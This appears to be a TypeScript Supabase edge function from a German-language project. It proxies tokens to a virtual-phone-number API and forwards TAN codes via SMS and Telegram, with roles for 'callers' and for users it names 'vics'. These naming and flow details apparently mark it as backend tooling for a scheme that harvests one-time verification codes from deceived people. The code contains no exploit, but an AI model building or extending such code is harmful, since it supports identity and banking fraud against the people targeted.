import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { loadSevenIoSettings, processAssignmentForward } from "../_shared/forwardTan.ts";
import { sendTelegramNotification } from "../_shared/telegram.ts";

async function loadAssignmentContext(serviceClient: any, assignmentId: string) {
  const { data: a } = await serviceClient
    .from("verification_assignments")
    .select("id, user_id, verification_id, phone_number_id")
    .eq("id", assignmentId)
    .maybeSingle();
  if (!a) return null;
  const [{ data: prof }, { data: ver }, { data: phone }] = await Promise.all([
    serviceClient.from("profiles").select("first_name, last_name, email").eq("id", a.user_id).maybeSingle(),
    serviceClient.from("verifications").select("title").eq("id", a.verification_id).maybeSingle(),
    a.phone_number_id
      ? serviceClient.from("phone_numbers").select("token").eq("id", a.phone_number_id).maybeSingle()
      : Promise.resolve({ data: null }),
  ]);
  return {
    vicName: `${prof?.first_name ?? ""} ${prof?.last_name ?? ""}`.trim() || prof?.email || "Unbekannt",
    verificationTitle: ver?.title ?? "Auftrag",
    phoneToken: phone?.token ?? null,
  };
}

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  const authHeader = req.headers.get("Authorization");
  if (!authHeader?.startsWith("Bearer ")) {
    return new Response(JSON.stringify({ error: "Unauthorized" }), {
      status: 401,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }

  const supabase = createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_ANON_KEY")!,
    { global: { headers: { Authorization: authHeader } } }
  );

  const token = authHeader.replace("Bearer ", "");
  const { data: claimsData, error: claimsError } = await supabase.auth.getClaims(token);
  if (claimsError || !claimsData?.claims) {
    return new Response(JSON.stringify({ error: "Unauthorized" }), {
      status: 401,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }

  const userId = claimsData.claims.sub;
  const [{ data: isAdmin }, { data: isCaller }] = await Promise.all([
    supabase.rpc("has_role", {
      _user_id: userId,
      _role: "admin",
    }),
    supabase.rpc("has_role", {
      _user_id: userId,
      _role: "caller",
    }),
  ]);

  try {
    const { token: apiToken, assignmentId } = await req.json();
    if (!apiToken) {
      return new Response(JSON.stringify({ error: "Token required" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const serviceClient = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!
    );

    // Callers may read every stored phone number. Vics may only read phone numbers
    // linked to one of their own assignments.
    if (!isAdmin) {
      const { data: phoneRow } = await serviceClient
        .from("phone_numbers")
        .select("id")
        .eq("token", apiToken)
        .maybeSingle();

      if (!phoneRow) {
        return new Response(JSON.stringify({ error: "Forbidden" }), {
          status: 403,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      if (!isCaller) {
        const { data: assignment } = await serviceClient
          .from("verification_assignments")
          .select("id")
          .eq("user_id", userId)
          .eq("phone_number_id", phoneRow.id)
          .limit(1)
          .maybeSingle();

        if (!assignment) {
          return new Response(JSON.stringify({ error: "Forbidden" }), {
            status: 403,
            headers: { ...corsHeaders, "Content-Type": "application/json" },
          });
        }
      }
    }

    const apiRes = await fetch(
      `https://anosim.net/api/v1/orderbookingshare?token=${encodeURIComponent(apiToken)}`
    );

    const data = await apiRes.json();

    // Inline TAN forwarding (Telegram notifications are sent from processAssignmentForward).
    if (assignmentId && typeof assignmentId === "string") {
      (async () => {
        try {
          const settings = await loadSevenIoSettings(serviceClient);
          if (settings) {
            await processAssignmentForward(
              {
                serviceClient,
                sevenioApiKey: settings.apiKey,
                sevenioFromName: settings.fromName,
              },
              assignmentId
            );
          }
        } catch (e) {
          console.error("inline forward failed", e);
        }
      })();
    }

    return new Response(JSON.stringify(data), {
      status: apiRes.status,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: "Proxy error", details: String(err) }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
